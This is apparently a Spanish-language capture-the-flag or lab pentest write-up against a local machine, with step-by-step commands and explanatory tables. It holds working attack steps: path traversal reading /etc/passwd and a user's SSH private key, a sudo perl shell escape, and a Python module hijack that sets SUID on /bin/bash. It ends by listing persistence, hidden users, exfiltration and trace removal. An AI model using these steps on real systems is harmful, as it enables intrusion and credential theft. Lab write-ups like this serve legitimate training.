# Informe de Explotación - Pentest a 172.17.0.2

## 1. Comprobación de Conectividad

```bash
ping 172.17.0.2
```

---

## 2. Escaneo de Puertos Abiertos

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
```

✅ **Puertos abiertos detectados**:
- **22/tcp** → SSH  
- **80/tcp** → HTTP

---

## 3. Detección de Versiones de Servicios

```bash
nmap -p22,80 -sCV 172.17.0.2
```

**Resultados**:
- **22/tcp** → OpenSSH 9.6p1 (Ubuntu 3ubuntu13.4)
- **80/tcp** → Apache httpd 2.4.58 (Ubuntu)

---

## 4. Enumeración de Directorios vía HTTP

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt
```

📂 **Directorios/Rutas encontradas**:
```
/.htaccess        (403)
/.htpasswd        (403)
/assets/          (301)
/.hta             (403)
/index.php        (200)
/server-status    (403)
```

🔎 `index.php` muestra una nueva página, pero al analizarla arroja un error, lo cual sugiere una posible vulnerabilidad de **File Inclusion**.

---

## 5. Fuzzing para Inclusión de Archivos

```bash
wfuzz -c -w /usr/share/wordlists/dirb/common.txt -u http://172.17.0.2/index.php?FUZZ --hw 169
```

| Parte del comando                        | Explicación                                                                                  |
|------------------------------------------|----------------------------------------------------------------------------------------------|
| `wfuzz`                                  | Ejecuta la herramienta de fuzzing.                                                           |
| `-c`                                     | Activa el **modo color** en la salida para facilitar la lectura (rojo, verde, etc).         |
| `-w /usr/share/wordlists/dirb/common.txt`| Indica el **diccionario** que se usará para el fuzzing. En este caso, uno común de directorios. |
| `-u http://172.17.0.2/index.php?FUZZ`    | URL objetivo. El texto `FUZZ` es un **marcador** que será reemplazado por cada palabra del diccionario. |
| `--hw 169`                               | **Filtro de respuestas**: oculta todas aquellas que devuelvan **exactamente 169 palabras** (probablemente respuestas repetitivas o errores genéricos). |

**Parámetros detectados**:
- `secret` produce una respuesta diferente, posible parámetro vulnerable.

📄 **Inclusión de archivo `/etc/passwd`**:
```
http://172.17.0.2/index.php?secret=../../../../../../etc/passwd
```

✅ Contenido del archivo confirmado (usuarios del sistema encontrados):
```
root:x:0:0:root:/root:/bin/bash
vaxei:x:1001:1001:,,,:/home/vaxei:/bin/bash
luisillo:x:1002:1002::/home/luisillo:/bin/sh
...
```

---

## 6. Acceso a Clave Privada SSH

```bash
http://172.17.0.2/index.php?secret=../../../../../../home/vaxei/.ssh/id_rsa
```

✅ **Clave privada encontrada**. Guardamos el archivo como `id_rsa` y accedemos al servidor:

```bash
chmod 600 id_rsa
ssh -i id_rsa vaxei@172.17.0.2
```

| Parte del comando       | Explicación                                                                 |
|--------------------------|-----------------------------------------------------------------------------|
| `chmod`                  | Comando para cambiar permisos de archivos.                                 |
| `600`                    | Asigna permisos de **lectura y escritura solo al propietario**.             |
| `id_rsa`                 | Archivo de clave privada SSH.                                               |

Esto es **necesario para que SSH acepte la clave privada**, ya que si tiene permisos más abiertos (por ejemplo, lectura para otros usuarios), el cliente SSH la rechazará por seguridad.

| Parte del comando                      | Explicación                                                                 |
|----------------------------------------|-----------------------------------------------------------------------------|
| `ssh`                                  | Cliente SSH para conectarse de forma remota a otro sistema.                |
| `-i id_rsa`                             | Especifica el **archivo de clave privada** (`id_rsa`) para la autenticación. |
| `vaxei@172.17.0.2`                      | Usuario (`vaxei`) y dirección IP del servidor al que se conecta.           |


🔐 Acceso SSH exitoso. Dentro del sistema, se encuentra un archivo `file.txt` sin relevancia.

---

## 7. Escalada de Privilegios

### Enumeración de permisos:

```bash
sudo -l
```

✅ Usuario `vaxei` puede ejecutar como `luisillo` sin contraseña:

```bash
(luisillo) NOPASSWD: /usr/bin/perl
```

### Escalada a `luisillo`:

```bash
sudo -u luisillo perl -e 'exec "/bin/sh";'
script /dev/null -c bash
```

| Parte del comando                     | Explicación                                                                 |
|---------------------------------------|-----------------------------------------------------------------------------|
| `sudo`                                | Ejecuta un comando con privilegios de otro usuario.                        |
| `-u luisillo`                         | Especifica que el comando se ejecutará como el usuario **luisillo**.       |
| `perl -e 'exec "/bin/sh";'`           | Usa **Perl** para ejecutar directamente un **shell `/bin/sh`**.            |

🔓 Este comando se utiliza comúnmente en escenarios de **escalada de privilegios**, cuando un usuario tiene permiso de `sudo` para ejecutar `perl` sin contraseña (`NOPASSWD`).  
El resultado es una **shell como el usuario `luisillo`**.

| Parte del comando               | Explicación                                                                 |
|---------------------------------|-----------------------------------------------------------------------------|
| `script`                        | Inicia una sesión de terminal grabada (por defecto, crea un archivo de log).|
| `/dev/null`                     | Redirige la salida del log a *nulo*, es decir, **no guarda nada**.         |
| `-c bash`                       | Ejecuta el comando especificado, en este caso, **inicia una shell Bash**.   |

Este comando se utiliza para **mejorar la interactividad** de una shell obtenida, por ejemplo, tras una explotación.  

Ideal para post-explotación cuando se ha conseguido una shell limitada.

📁 Explorando como `luisillo`, se encuentra el archivo `/opt/paw.py`.

---

## 8. Escalada a Root vía Archivo Python Malicioso

**Análisis del archivo `paw.py`**:  
Este intenta importar `subprocess`, pero dicho archivo no existe. El script se ejecuta como root.

✅ Creamos un archivo falso `subprocess.py`:

```python
# subprocess.py
import os
os.system("chmod u+s /bin/bash")
```

| Parte del comando           | Explicación                                                                 |
|----------------------------|-----------------------------------------------------------------------------|
| `chmod`                    | Comando para cambiar permisos de archivos o directorios.                   |
| `u+s`                      | **Activa el bit SUID**: cuando un usuario ejecuta el archivo, lo hace con los permisos del **propietario** (en este caso, root). |
| `/bin/bash`                | Ruta al binario de Bash. Aplicar el SUID aquí permite ejecutar Bash como root. ⚠️ Muy peligroso. |

Este cambio da acceso root a cualquier usuario que ejecute `/bin/bash`. Solo se usa en pruebas de escalada de privilegios o CTFs.

Ejecutamos el script:

```bash
sudo -u root /usr/bin/python3 /opt/paw.py
```

Accedemos a root usando:

```bash
bash -p
```

---

## 9. Post-Explotación

🔒 **Acciones recomendadas tras obtener acceso root**:

- ✅ Establecer persistencia
- 👤 Crear un usuario oculto
- 🔐 Añadir clave pública SSH
- 📂 Exfiltrar información sensible
- 🌐 Explorar red interna
- 🔄 Pivoting a otras máquinas
- 🧹 Eliminar rastros
- ⚠️ Destrucción del sistema (no recomendada)
